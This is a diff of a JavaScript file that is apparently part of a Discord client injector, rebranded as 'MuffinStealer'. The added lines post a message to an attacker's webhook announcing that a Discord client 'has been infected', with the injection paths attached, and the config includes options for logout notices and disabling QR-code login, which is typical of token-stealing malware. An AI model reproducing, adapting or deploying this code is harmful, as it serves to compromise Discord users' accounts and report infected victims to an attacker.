@@ -1,4 +1,3 @@
-
 // Code is shit
 var glob = require("glob");
 const fs = require('fs');
@@ -13,7 +12,7 @@ const config = {
     "inject-notify": "%INJECTNOTI%1",
     "logout-notify": "%LOGOUTNOTI%1",
     "init-notify":"%INITNOTI%1",
-    "embed-color": "%MBEDCOLOR%1",
+    "embed-color": %MBEDCOLOR%1,
     "disable-qr-code": "%DISABLEQRCODE%1"
 }
 
@@ -159,7 +158,7 @@ function injectNotify() {
     var fields = [];
     injectPath.forEach( path => {
         var c = {
-            name: ":syringe: Inject Path",
+            name: "",
             value: `\`\`\`${path}\`\`\``,
             inline: !1
         }
@@ -167,17 +166,17 @@ function injectNotify() {
     })
     axios
 	.post(webhook, {
-        "content": "@everyone :detective: Successfull injection",
+        "content": "**@everyone <a:happy_happy:939130704636305438> Congratulations A Discord client has been has been infected with MuffinStealer**",
         "embeds": [
           {
             "title": "",
             "color": config["embed-color"],
             "fields": fields,
             "author": {
-              "name": ""
+              "name": "MuffinStealer"
             },
             "footer": {
-              "text": ""
+              "text": "MuffinStealer"
             }
           }
         ]
@@ -189,4 +188,3 @@ function injectNotify() {
     })
 
 }
-
